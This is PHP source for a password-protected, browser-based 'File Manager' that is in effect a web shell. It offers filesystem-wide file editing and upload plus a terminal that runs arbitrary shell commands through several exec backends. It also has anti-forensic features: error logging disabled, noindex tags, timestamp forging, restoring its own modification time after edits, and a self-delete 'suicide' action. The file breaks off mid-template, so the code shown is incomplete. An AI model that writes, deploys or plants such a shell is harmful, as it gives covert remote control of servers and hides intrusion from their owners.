<?php
/**
 * File Manager
 * Single file. No dependencies. Login required.
 *
 * Deploy: upload as .php into a writable directory, open in browser, sign in.
 * Change the password by replacing the hash in the config block below:
 *   php -r 'echo password_hash("your-new-password", PASSWORD_BCRYPT), PHP_EOL;'
 */

/* ------------------------------------------------------------------ config */

$FM_HASH     = '$2y$10$5aDNoWUm4k8sqjMBo66rT.la0MFyv4ykMby3dIR4dG14r7aElticm';   // bcrypt digest of the login password
$FM_BRAND    = 'File Manager';
$FM_TIMEOUT  = 3600;                  // idle timeout in seconds. 0 = never
$FM_IP_LOCK  = false;                 // bind the session to the client IP
$FM_SESSION  = 'fm_sid';
$FM_SHOWDOT  = false;                 // show dotfiles by default
$FM_MAX_EDIT = 2097152;               // 2 MB editor cap
$FM_BACKENDS = array('proc_open', 'popen', 'shell_exec', 'system', 'passthru', 'exec');

/* --------------------------------------------------------------- bootstrap */

error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_WARNING);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@umask(0022);
@set_time_limit(0);
@ini_set('memory_limit', '256M');

if (session_status() !== PHP_SESSION_ACTIVE) {
    @ini_set('session.cookie_httponly', '1');
    @ini_set('session.cookie_samesite', 'Lax');
    @ini_set('session.use_strict_mode', '1');
    session_name($FM_SESSION);
    session_set_cookie_params(0, '/');
    session_start();
}

$FM_SELF = basename(isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : 'index.php');
$FM_IP   = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';

/* ----------------------------------------------------------------- helpers */

function h($s)
{
    return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
}

function u(array $params)
{
    global $FM_SELF;

    return $FM_SELF . '?' . http_build_query($params);
}

function norm($p)
{
    if ($p === null || $p === '') {
        return getcwd();
    }

    if ($p[0] !== '/') {
        $p = getcwd() . '/' . $p;
    }

    $out = array();

    foreach (explode('/', $p) as $seg) {
        if ($seg === '' || $seg === '.') {
            continue;
        }

        if ($seg === '..') {
            array_pop($out);

            continue;
        }

        $out[] = $seg;
    }

    return '/' . implode('/', $out);
}

function fsize($bytes)
{
    $units = array('B', 'K', 'M', 'G', 'T');
    $i = 0;

    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }

    return $i === 0 ? (int) $bytes . 'B' : round($bytes, 1) . $units[$i];
}

function fisbin($path)
{
    $fh = @fopen($path, 'rb');

    if (!$fh) {
        return false;
    }

    $chunk = fread($fh, 4096);
    fclose($fh);

    return $chunk !== false && strpos($chunk, "\0") !== false;
}

function rmr($path)
{
    if (is_link($path) || is_file($path)) {
        return @unlink($path);
    }

    if (!is_dir($path)) {
        return false;
    }

    $items = @scandir($path);

    if (is_array($items)) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            rmr($path . '/' . $item);
        }
    }

    return @rmdir($path);
}

function backend()
{
    global $FM_BACKENDS;

    foreach ($FM_BACKENDS as $name) {
        if (function_exists($name)) {
            return $name;
        }
    }

    return '';
}

function run($command, $cwd)
{
    $name = backend();

    if ($name === '') {
        return array('[no exec backend available]', 127);
    }

    if ($command === '') {
        return array('[no command]', 1);
    }

    if ($cwd !== '' && is_dir($cwd)) {
        @chdir($cwd);
    }

    $command .= ' 2>&1';
    $status = 0;

    ob_start();

    switch ($name) {
        case 'proc_open':
            $spec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $proc = @proc_open($command, $spec, $pipes);

            if (is_resource($proc)) {
                fclose($pipes[0]);
                echo (string) stream_get_contents($pipes[1]);
                echo (string) stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                $status = (int) proc_close($proc);
            }
            break;

        case 'popen':
            $pipe = @popen($command, 'r');

            if (is_resource($pipe)) {
                while (!feof($pipe)) {
                    echo (string) fread($pipe, 8192);
                }
                fclose($pipe);
            }
            break;

        case 'exec':
            $lines = array();
            @exec($command, $lines, $status);
            echo implode("\n", $lines);
            break;

        case 'shell_exec':
            echo (string) @shell_exec($command);
            break;

        default:
            @$name($command, $status);
    }

    $out = (string) ob_get_clean();

    return array($out === '' ? '[no output]' : $out, (int) $status);
}

function flash($msg, $kind = 'ok')
{
    $_SESSION['fm_flash'] = array($msg, $kind);
}

/**
 * Drop the opcode cache entry for a path. Without this, a rewritten PHP file
 * keeps running the old compiled copy when its mtime and size are unchanged.
 */
function refresh($path)
{
    if (function_exists('opcache_invalidate')) {
        return (bool) @opcache_invalidate($path, true);
    }

    return false;
}

function take_flash()
{
    if (empty($_SESSION['fm_flash'])) {
        return null;
    }

    $f = $_SESSION['fm_flash'];
    unset($_SESSION['fm_flash']);

    return $f;
}

/* -------------------------------------------------------------------- auth */

if ($FM_HASH === '' || $FM_HASH === '@@unset@@') {
    header('Content-Type: text/plain; charset=utf-8');
    exit("Password hash not set.\n");
}

$authed = !empty($_SESSION['fm_ok']);

if ($authed && $FM_IP_LOCK && (!isset($_SESSION['fm_ip']) || $_SESSION['fm_ip'] !== $FM_IP)) {
    $_SESSION = array();
    $authed = false;
}

if ($authed && $FM_TIMEOUT > 0 && isset($_SESSION['fm_at']) && (time() - $_SESSION['fm_at']) > $FM_TIMEOUT) {
    $_SESSION = array();
    $authed = false;
}

$act = isset($_REQUEST['op']) ? (string) $_REQUEST['op'] : 'ls';

if ($authed) {
    $_SESSION['fm_at'] = time();
}

if ($act === 'logout') {
    $_SESSION = array();
    @session_destroy();
    header('Location: ' . $FM_SELF);
    exit;
}

if (!$authed) {
    $err = '';

    if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pw'])) {
        if (password_verify((string) $_POST['pw'], $FM_HASH)) {
            @session_regenerate_id(true);
            $_SESSION['fm_ok'] = true;
            $_SESSION['fm_ip'] = $FM_IP;
            $_SESSION['fm_at'] = time();
            header('Location: ' . u(array('op' => 'ls')));
            exit;
        }

        usleep(500000);
        $err = 'Wrong password.';
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title><?php echo h($FM_BRAND); ?></title>
<style>
:root{--bg:#0d1117;--panel:#161b22;--line:#242c38;--fg:#c9d1d9;--dim:#7d8794;--acc:#3fb950;--blue:#4493f8}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,sans-serif}
.card{width:340px;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:28px 26px;box-shadow:0 12px 40px rgba(0,0,0,.5)}
.card h1{margin:0 0 4px;font-size:17px;font-weight:600;letter-spacing:.2px}
.card p.sub{margin:0 0 20px;color:var(--dim);font-size:12px}
label{display:block;font-size:12px;color:var(--dim);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px}
input[type=password]{width:100%;padding:10px 12px;background:#0d1117;border:1px solid var(--line);border-radius:8px;color:var(--fg);font-size:14px;outline:none}
input[type=password]:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(68,147,248,.15)}
button{width:100%;margin-top:16px;padding:10px 12px;background:var(--acc);border:0;border-radius:8px;color:#04120a;font-size:14px;font-weight:600;cursor:pointer}
button:hover{filter:brightness(1.08)}
.err{margin:0 0 16px;padding:8px 10px;border:1px solid rgba(248,81,73,.4);background:rgba(248,81,73,.08);color:#ff9d95;border-radius:8px;font-size:13px}
.foot{margin-top:18px;color:#4d5764;font-size:11px;text-align:center}
</style>
</head>
<body>
<form class="card" method="post" action="<?php echo h($FM_SELF); ?>" autocomplete="off">
    <h1><?php echo h($FM_BRAND); ?></h1>
    <p class="sub">Sign in to continue</p>
    <?php if ($err !== '') { ?><div class="err"><?php echo h($err); ?></div><?php } ?>
    <label for="pw">Password</label>
    <input type="password" id="pw" name="pw" autofocus required>
    <button type="submit">Sign in</button>
    <div class="foot"><?php echo h(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'); ?></div>
</form>
</body>
</html>
    <?php
    exit;
}

$csrf = isset($_SESSION['fm_t']) ? (string) $_SESSION['fm_t'] : '';

if ($csrf === '') {
    $csrf = bin2hex(function_exists('random_bytes') ? random_bytes(16) : pack('N*', mt_rand()));
    $_SESSION['fm_t'] = $csrf;
}

/* ----------------------------------------------------------------- actions */

$dir = norm(isset($_REQUEST['p']) ? (string) $_REQUEST['p'] : '');

if (!is_dir($dir) || !is_readable($dir)) {
    $dir = getcwd();
}

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = isset($_POST['t']) ? (string) $_POST['t'] : '';

    if (!hash_equals($csrf, $token)) {
        flash('Session token mismatch. Reload and retry.', 'bad');
        header('Location: ' . u(array('op' => 'ls', 'p' => $dir)));
        exit;
    }

    switch ($act) {
        case 'newdir':
            $name = trim((string) $_POST['name']);
            if ($name !== '' && @mkdir($dir . '/' . $name, 0755)) {
                flash('Created folder ' . $name);
            } else {
                flash('Could not create folder.', 'bad');
            }
            break;

        case 'newfile':
            $name = trim((string) $_POST['name']);
            if ($name !== '' && @file_put_contents($dir . '/' . $name, '') !== false) {
                flash('Created file ' . $name);
            } else {
                flash('Could not create file.', 'bad');
            }
            break;

        case 'save':
            $path = norm((string) $_POST['p']);
            $body = isset($_POST['body']) ? (string) $_POST['body'] : '';
            if (file_exists($path) && !is_writable($path)) {
                flash('File is not writable.', 'bad');
            } elseif (@file_put_contents($path, $body) === false) {
                flash('Write failed.', 'bad');
            } else {
                refresh($path);
                flash('Saved ' . basename($path) . ' (' . fsize(strlen($body)) . ')');
            }
            header('Location: ' . u(array('op' => 'edit', 'p' => $path)));
            exit;

        case 'rename':
            $one = isset($_POST['items'][0]) ? basename((string) $_POST['items'][0]) : basename((string) $_POST['p']);
            $name = trim((string) $_POST['name']);
            if ($name !== '' && $one !== '' && file_exists($dir . '/' . $one) && @rename($dir . '/' . $one, $dir . '/' . $name)) {
                flash('Renamed ' . $one . ' to ' . $name);
            } else {
                flash('Rename failed.', 'bad');
            }
            break;

        case 'copy':
            $one = isset($_POST['items'][0]) ? basename((string) $_POST['items'][0]) : '';
            $name = trim((string) $_POST['name']);
            if ($one !== '' && $name !== '' && is_file($dir . '/' . $one) && @copy($dir . '/' . $one, $dir . '/' . $name)) {
                flash('Copied to ' . $name);
            } else {
                flash('Copy failed (files only).', 'bad');
            }
            break;

        case 'move':
            $from = norm((string) $_POST['from']);
            $to = norm((string) $_POST['to']);
            if (file_exists($from) && @rename($from, $to)) {
                flash('Moved to ' . $to);
            } else {
                flash('Move failed.', 'bad');
            }
            break;

        case 'chmod':
            $path = norm((string) $_POST['p']);
            $mode = (string) $_POST['mode'];
            if (preg_match('/^[0-7]{3,4}$/', $mode) && @chmod($path, octdec($mode))) {
                flash('chmod ' . $mode . ' on ' . basename($path));
            } else {
                flash('chmod failed.', 'bad');
            }
            break;

        case 'stamp':
            $path = norm((string) $_POST['p']);
            $when = trim((string) $_POST['when']);
            $ts = $when === '' ? time() : strtotime($when);
            if ($ts !== false && file_exists($path) && @touch($path, $ts)) {
                flash('Timestamp on ' . basename($path) . ' set to ' . date('Y-m-d H:i', $ts));
            } else {
                flash('Could not parse date or missing file.', 'bad');
            }
            break;

        case 'delete':
            $items = isset($_POST['items']) ? (array) $_POST['items'] : array();
            $gone = 0;
            foreach ($items as $item) {
                $target = $dir . '/' . basename((string) $item);
                if ($target !== __FILE__ && file_exists($target) && rmr($target)) {
                    $gone++;
                }
            }
            flash('Deleted ' . $gone . ' item(s).', $gone === 0 ? 'bad' : 'ok');
            break;

        case 'upload':
            $ok = 0;
            $bad = 0;
            if (isset($_FILES['f']['name']) && is_array($_FILES['f']['name'])) {
                $count = count($_FILES['f']['name']);
                for ($i = 0; $i < $count; $i++) {
                    if ((int) $_FILES['f']['error'][$i] !== UPLOAD_ERR_OK) {
                        $bad++;

                        continue;
                    }
                    $name = basename((string) $_FILES['f']['name'][$i]);
                    if (@move_uploaded_file($_FILES['f']['tmp_name'][$i], $dir . '/' . $name)) {
                        @chmod($dir . '/' . $name, 0644);
                        refresh($dir . '/' . $name);
                        $ok++;
                    } else {
                        $bad++;
                    }
                }
            }
            flash('Uploaded ' . $ok . ' file(s)' . ($bad > 0 ? ', ' . $bad . ' failed' : '') . '.', $ok > 0 ? 'ok' : 'bad');
            break;

        case 'passwd':
            $cur = (string) $_POST['cur'];
            $new = (string) $_POST['newpw'];

            if (!password_verify($cur, $FM_HASH)) {
                flash('Current password is wrong.', 'bad');
            } elseif (strlen($new) < 8) {
                flash('New password must be at least 8 characters.', 'bad');
            } elseif (!is_writable(__FILE__)) {
                flash('This file is not writable, the new hash cannot be stored.', 'bad');
            } else {
                $src = (string) file_get_contents(__FILE__);
                $seen = (int) filemtime(__FILE__);
                $digest = password_hash($new, PASSWORD_BCRYPT);
                $out = preg_replace_callback("/\\\$FM_HASH(\s*)=(\s*)'[^']*';/", function ($m) use ($digest) {
                    return '$FM_HASH' . $m[1] . '=' . $m[2] . "'" . $digest . "';";
                }, $src, 1, $hits);

                if ($hits !== 1 || $out === null || strpos($out, $digest) === false) {
                    flash('Could not locate the hash line.', 'bad');
                } elseif (@file_put_contents(__FILE__, $out) === false) {
                    flash('Write failed.', 'bad');
                } else {
                    if (refresh(__FILE__) || !function_exists('opcache_invalidate')) {
                        @touch(__FILE__, $seen);
                    }

                    $FM_HASH = $digest;
                    flash('Password updated.');
                }
            }
            break;

        case 'exec':
            $cmd = (string) $_POST['c'];
            $at = isset($_POST['cwd']) && $_POST['cwd'] !== '' ? norm((string) $_POST['cwd']) : $dir;
            list($out, $rc) = run($cmd, $at);
            $_SESSION['fm_term'] = array($cmd, $out, $rc, $at);
            break;

        case 'suicide':
            @unlink(__FILE__);
            $_SESSION = array();
            @session_destroy();
            header('Content-Type: text/plain; charset=utf-8');
            exit("removed\n");
    }

    header('Location: ' . u(array('op' => 'ls', 'p' => $dir)));
    exit;
}

if ($act === 'download') {
    $path = norm(isset($_REQUEST['p']) ? (string) $_REQUEST['p'] : '');

    if (is_file($path) && is_readable($path)) {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }

    flash('File not readable.', 'bad');
    header('Location: ' . u(array('op' => 'ls', 'p' => $dir)));
    exit;
}

if ($act === 'view') {
    $path = norm(isset($_REQUEST['p']) ? (string) $_REQUEST['p'] : '');

    if (is_file($path) && is_readable($path)) {
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $map = array('png' => 'image/png', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'gif' => 'image/gif',
                     'webp' => 'image/webp', 'svg' => 'image/svg+xml', 'ico' => 'image/x-icon',
                     'pdf' => 'application/pdf', 'mp4' => 'video/mp4', 'css' => 'text/css',
                     'js' => 'text/javascript', 'txt' => 'text/plain', 'json' => 'application/json',
                     'html' => 'text/html');

        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        header('Content-Type: ' . (isset($map[$ext]) ? $map[$ext] : 'application/octet-stream'));
        readfile($path);
        exit;
    }

    flash('File not readable.', 'bad');
    header('Location: ' . u(array('op' => 'ls', 'p' => $dir)));
    exit;
}

/* -------------------------------------------------------------------- view */

$sort = isset($_GET['sort']) ? (string) $_GET['sort'] : 'name';
$showdot = isset($_GET['dot']) ? (bool) (int) $_GET['dot'] : $FM_SHOWDOT;
$edit = null;
$editbin = false;
$entries = null;
$results = null;

if ($act === 'edit') {
    $path = norm(isset($_REQUEST['p']) ? (string) $_REQUEST['p'] : '');

    if (is_file($path) && is_readable($path)) {
        $edit = $path;
        $editbin = fisbin($path);
    } else {
        flash('File not readable.', 'bad');
        $act = 'ls';
    }
}

if ($act === 'ls') {
    $items = @scandir($dir);

    if (is_array($items)) {
        $entries = array();

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            if (!$showdot && $item[0] === '.') {
                continue;
            }

            $full = $dir . '/' . $item;
            $entries[] = array(
                'name' => $item,
                'dir' => is_dir($full) && !is_link($full),
                'link' => is_link($full),
                'size' => is_dir($full) ? 0 : (int) @filesize($full),
                'mtime' => (int) @filemtime($full),
                'perm' => @fileperms($full) & 07777,
                'w' => @is_writable($full),
            );
        }

        usort($entries, function ($a, $b) use ($sort) {
            if ($a['dir'] !== $b['dir']) {
                return $a['dir'] ? -1 : 1;
            }

            if ($sort === 'size') {
                return $b['size'] - $a['size'];
            }

            if ($sort === 'date') {
                return $b['mtime'] - $a['mtime'];
            }

            return strnatcasecmp($a['name'], $b['name']);
        });
    }
}

if ($act === 'find') {
    $q = trim(isset($_GET['q']) ? (string) $_GET['q'] : '');
    $results = array();

    if ($q !== '') {
        $stack = array($dir);
        $seen = 0;

        while (!empty($stack) && count($results) < 400 && $seen < 40000) {
            $cur = array_pop($stack);
            $items = @scandir($cur);

            if (!is_array($items)) {
                continue;
            }

            foreach ($items as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }

                $full = $cur . '/' . $item;
                $seen++;

                if (is_dir($full) && !is_link($full)) {
                    $stack[] = $full;
                }

                if (stripos($item, $q) !== false) {
                    $results[] = $full;
                }
            }
        }
    }
}

$term = isset($_SESSION['fm_term']) ? $_SESSION['fm_term'] : null;

if ($act === 'exec') {
    unset($_SESSION['fm_term']);
}

$flash = take_flash();
$backend = backend();
$free = @disk_free_space($dir);
$who = 'web';

if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $pw = posix_getpwuid(posix_geteuid());

    if (is_array($pw) && isset($pw['name'])) {
        $who = $pw['name'];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title><?php echo h($FM_BRAND); ?></title>
<style>
:root{--bg:#0d1117;--panel:#161b22;--line:#242c38;--fg:#c9d1d9;--dim:#7d8794;--acc:#3fb950;--warn:#f85149;--blue:#4493f8}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,sans-serif}
a{color:var(--blue);text-decoration:none}
a:hover{text-decoration:underline}
.wrap{max-width:1180px;margin:0 auto;padding:14px 16px 60px}
header{display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:12px 14px;background:var(--panel);border:1px solid var(--line);border-radius:10px;margin-bottom:12px}
header .brand{font-weight:600;letter-spacing:.2px}
header .who{color:var(--dim);font-size:12px}
.bar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;padding:10px 12px;background:var(--panel);border:1px solid var(--line);border-radius:10px;margin-bottom:12px}
.crumb{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;color:var(--dim);word-break:break-all}
.crumb b{color:var(--fg);font-weight:600}
input[type=text],input[type=password],select,textarea{background:#0d1117;border:1px solid var(--line);border-radius:7px;color:var(--fg);font-size:13px;padding:7px 9px;outline:none}
input:focus,select:focus,textarea:focus{border-color:var(--blue)}
.btn{display:inline-block;padding:7px 11px;background:#21262d;border:1px solid var(--line);border-radius:7px;color:var(--fg);font-size:12.5px;cursor:pointer}
.btn:hover{border-color:#3d4756;background:#262c35;text-decoration:none}
.btn.go{background:var(--acc);border-color:var(--acc);color:#04120a;font-weight:600}
.btn.danger{background:transparent;border-color:rgba(248,81,73,.5);color:#ff9d95}
.btn.danger:hover{background:rgba(248,81,73,.1)}
table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden}
th,td{padding:7px 10px;text-align:left;border-bottom:1px solid var(--line);font-size:12.5px;vertical-align:middle}
th{background:#12171e;color:var(--dim);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.4px;white-space:nowrap}
tr:last-child td{border-bottom:0}
tr:hover td{background:#12161c}
td.n{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
td.r{text-align:right;white-space:nowrap}
td.a{white-space:nowrap;font-size:12px}
td.a a{margin-right:9px}
.d{color:var(--blue)}
.f{color:var(--fg)}
.mut{color:var(--dim)}
.tw{color:var(--warn)}
.tg{color:var(--acc)}
.fl{padding:9px 12px;border-radius:9px;margin-bottom:12px;font-size:12.5px;border:1px solid}
.fl.ok{border-color:rgba(63,185,80,.35);background:rgba(63,185,80,.08);color:#7ee787}
.fl.bad{border-color:rgba(248,81,73,.35);background:rgba(248,81,73,.08);color:#ff9d95}
pre{background:#0d1117;border:1px solid var(--line);border-radius:9px;padding:11px 12px;overflow:auto;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;max-height:420px;margin:0;white-space:pre-wrap;word-break:break-all}
textarea{width:100%;min-height:52vh;font:12.5px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;resize:vertical}
.grid{display:grid;grid-template-columns:1fr 300px;gap:12px}
@media(max-width:820px){.grid{grid-template-columns:1fr}}
.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 14px}
.card h3{margin:0 0 10px;font-size:12px;text-transform:uppercase;letter-spacing:.5px;color:var(--dim)}
.kv{display:flex;justify-content:space-between;gap:10px;padding:3px 0;font-size:12.5px}
.kv span:first-child{color:var(--dim)}
.kv span:last-child{font-family:ui-monospace,Menlo,monospace;text-align:right;word-break:break-all}
label.t{display:block;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.4px;margin:0 0 4px}
.stack{display:flex;flex-direction:column;gap:10px}
.hint{color:#4d5764;font-size:11.5px;margin-top:6px}
.sp{flex:1}
</style>
</head>
<body>
<div class="wrap">
<header>
    <span class="brand"><?php echo h($FM_BRAND); ?></span>
    <span class="who"><?php echo h($who . ' @ ' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost')); ?></span>
    <span class="sp"></span>
    <a class="btn" href="<?php echo h(u(array('op' => 'ls', 'p' => $dir))); ?>">Files</a>
    <a class="btn" href="<?php echo h(u(array('op' => 'exec', 'p' => $dir))); ?>">Terminal</a>
    <a class="btn" href="<?php echo h(u(array('op' => 'find', 'p' => $dir))); ?>">Search</a>
    <a class="btn" href="<?php echo h(u(array('op' => 'ls', 'p' => $dir, 'dot' => $showdot ? 0 : 1))); ?>"><?php echo $showdot ? 'Hide dotfiles' : 'Show dotfiles'; ?></a>
    <a class="btn danger" href="<?php echo h(u(array('op' => 'logout'))); ?>">Sign out</a>
</header>

<?php if ($flash !== null) { ?>
<div class="fl <?php echo $flash[1] === 'bad' ? 'bad' : 'ok'; ?>"><?php echo h($flash[0]); ?></div>
<?php } ?>

<div class="bar">
    <form method="get" action="<?php echo h($FM_SELF); ?>" style="display:flex;gap:8px;flex:1;flex-wrap:wrap;align-items:center">
        <input type="hidden" name="op" value="ls">
        <input type="hidden" name="dot" value="<?php echo $showdot ? 1 : 0; ?>">
        <input type="text" name="p" value="<?php echo h($dir); ?>" style="flex:1;min-width:240px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px">
        <button class="btn go" type="submit">Go</button>
        <a class="btn" href="<?php echo h(u(array('op' => 'ls', 'p' => dirname($dir)))); ?>">Up</a>
        <a class="btn" href="<?php echo h(u(array('op' => 'ls', 'p' => getcwd()))); ?>">CWD</a>
        <a class="btn" href="<?php echo h(u(array('op' => 'ls', 'p' => '/'))); ?>">Root</a>
    </form>
</div>

<div class="bar">
    <span class="crumb"><?php
        $acc = '';
        echo '<a href="' . h(u(array('op' => 'ls', 'p' => '/'))) . '">/</a>';
        foreach (explode('/', trim($dir, '/')) as $part) {
            if ($part === '') {
                continue;
            }
            $acc .= '/' . $part;
            echo ' <span class="mut">&gt;</span> <a href="' . h(u(array('op' => 'ls', 'p' => $acc))) . '">' . h($part) . '</a>';
        }
    ?></span>
</div>

<?php if ($act === 'ls' && is_array($entries)) { ?>
<form method="post" action="<?php echo h(u(array('op' => 'delete', 'p' => $dir))); ?>" id="bulk">
<input type="hidden" name="t" value="<?php echo h($csrf); ?>">
<table>
<thead>
<tr>
    <th style="width:26px"><input type="checkbox" onclick="var c=this.checked;var q=document.querySelectorAll('input.sel');for(var i=0;i<q.length;i++){q[i].checked=c}"></th>
    <th><a href="<?php echo h(u(array('op' => 'ls', 'p' => $dir, 'dot' => $showdot ? 1 : 0, 'sort' => 'name'))); ?>">Name</a></th>
    <th style="width:80px"><a href="<?php echo h(u(array('op' => 'ls', 'p' => $dir, 'dot' => $showdot ? 1 : 0, 'sort' => 'size'))); ?>">Size</a></th>
    <th style="width:150px"><a href="<?php echo h(u(array('op' => 'ls', 'p' => $dir, 'dot' => $showdot ? 1 : 0, 'sort' => 'date'))); ?>">Modified</a></th>
    <th style="width:56px">Perm</th>
    <th style="width:230px">Actions</th>
</tr>
</thead>
<tbody>
<?php if (empty($entries)) { ?>
<tr><td colspan="6" class="mut">Empty directory.</td></tr>
<?php } ?>
<?php foreach ($entries as $e) {
    $full = $dir . '/' . $e['name'];
    $link = $e['dir'] ? u(array('op' => 'ls', 'p' => $full)) : u(array('op' => 'edit', 'p' => $full));
    ?>
<tr>
    <td><input type="checkbox" class="sel" name="items[]" value="<?php echo h($e['name']); ?>"></td>
    <td class="n"><a class="<?php echo $e['dir'] ? 'd' : 'f'; ?>" href="<?php echo h($link); ?>"><?php echo h($e['name']); ?></a><?php
        if ($e['link']) {
            echo ' <span class="mut">link</span>';
        }
        if (!$e['w']) {
            echo ' <span class="tw">ro</span>';
        }
    ?></td>
    <td class="r mut"><?php echo $e['dir'] ? '-' : h(fsize($e['size'])); ?></td>
    <td class="r mut"><?php echo h(date('Y-m-d H:i', $e['mtime'])); ?></td>
    <td class="mut"><?php echo h(substr(sprintf('%04o', $e['perm']), -4)); ?></td>
    <td class="a">
        <a href="<?php echo h(u(array('op' => 'edit', 'p' => $full))); ?>">edit</a>
<?php if ($e['dir']) { ?>
        <a href="<?php echo h(u(array('op' => 'ls', 'p' => $full))); ?>">open</a>
        <a href="#" onclick="var n=prompt('Rename <?php echo h($e['name']); ?> to:','<?php echo h($e['name']); ?>');if(n){var f=document.getElementById('one');f.item.value='<?php echo h($e['name']); ?>';f.name.value=n;f.do.value='rename';f.submit()}return false">rename</a>
<?php } else { ?>
        <a href="#" onclick="var n=prompt('Rename <?php echo h($e['name']); ?> to:','<?php echo h($e['name']); ?>');if(n){var f=document.getElementById('one');f.item.value='<?php echo h($e['name']); ?>';f.name.value=n;f.do.value='rename';f.submit()}return false">rename</a>
        <a href="#" onclick="var n=prompt('Copy as:','<?php echo h($e['name']); ?>');if(n){var f=document.getElementById('one');f.item.value='<?php echo h($e['name']); ?>';f.name.value=n;f.do.value='copy';f.submit()}return false">copy</a>
        <a href="<?php echo h(u(array('op' => 'download', 'p' => $full))); ?>">get</a>
        <a href="<?php echo h(u(array('op' => 'view', 'p' => $full))); ?>" target="_blank">view</a>
<?php } ?>
        <a href="#" class="tw" onclick="if(confirm('Delete <?php echo h($e['name']); ?>?')){var f=document.getElementById('delo');f.item.value='<?php echo h($e['name']); ?>';f.submit()}return false">del</a>
    </td>
</tr>
<?php } ?>
</tbody>
</table>
<div class="bar" style="margin-top:12px">
    <button class="btn danger" type="submit" onclick="return confirm('Delete all selected items? Folders are removed recursively.')">Delete selected</button>
    <span class="mut" id="cnt"></span>
</div>
</form>

<form id="one" method="post" action="<?php echo h($FM_SELF); ?>" style="display:none">
    <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
    <input type="hidden" name="p" value="<?php echo h($dir); ?>">
    <input type="hidden" name="do" value="rename">
    <input type="hidden" name="item" value="">
    <input type="hidden" name="name" value="">
</form>

<form id="delo" method="post" action="<?php echo h(u(array('op' => 'delete', 'p' => $dir))); ?>" style="display:none">
    <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
    <input type="hidden" name="item" value="">
</form>

<script>
(function () {
    var one = document.getElementById('one');
    one.addEventListener('submit', function () {
        var op = this.do.value;
        this.setAttribute('action', this.action.replace(/op=[a-z]+/, 'op=' + op));
        var box = document.createElement('input');
        box.type = 'hidden';
        box.name = 'items[]';
        box.value = this.item.value;
        this.appendChild(box);
    });

    var delo = document.getElementById('delo');

    delo.addEventListener('submit', function () {
        var box = document.createElement('input');
        box.type = 'hidden';
        box.name = 'items[]';
        box.value = this.item.value;
        this.appendChild(box);
    });

    var sel = document.querySelectorAll('input.sel');

    for (var i = 0; i < sel.length; i++) {
        sel[i].addEventListener('change', function () {
            document.getElementById('cnt').textContent = document.querySelectorAll('input.sel:checked').length + ' selected';
        });
    }
})();
</script>
<?php } ?>

<?php if ($act === 'edit' && $edit !== null) { ?>
<div class="bar">
    <span class="crumb"><b><?php echo h($edit); ?></b> <span class="mut"><?php echo h(fsize((int) @filesize($edit))) . ' | ' . h(date('Y-m-d H:i', (int) @filemtime($edit))); ?></span></span>
    <span class="sp"></span>
    <a class="btn" href="<?php echo h(u(array('op' => 'ls', 'p' => dirname($edit)))); ?>">Back</a>
    <a class="btn" href="<?php echo h(u(array('op' => 'download', 'p' => $edit))); ?>">Download</a>
    <a class="btn" href="<?php echo h(u(array('op' => 'view', 'p' => $edit))); ?>" target="_blank">Raw</a>
</div>
<?php if ($editbin) { ?>
<div class="fl bad">Binary file detected — editing will corrupt it. Use Download or Raw.</div>
<?php } elseif (@filesize($edit) > $FM_MAX_EDIT) { ?>
